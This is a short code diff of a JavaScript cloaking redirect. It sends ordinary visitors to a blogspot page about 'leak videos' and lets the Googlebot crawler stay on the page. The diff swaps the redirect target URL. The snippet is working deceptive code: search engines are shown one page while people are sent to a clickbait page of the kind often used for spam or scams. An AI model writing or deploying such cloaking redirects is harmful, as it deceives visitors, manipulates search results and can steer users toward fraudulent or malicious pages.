@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://asba-koby-2026.blogspot.com/2026/11/vodeo-1sc.html";
+  window.location.href = "https://asba-koby-2026.blogspot.com/2026/11/1sc-leak-videos.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
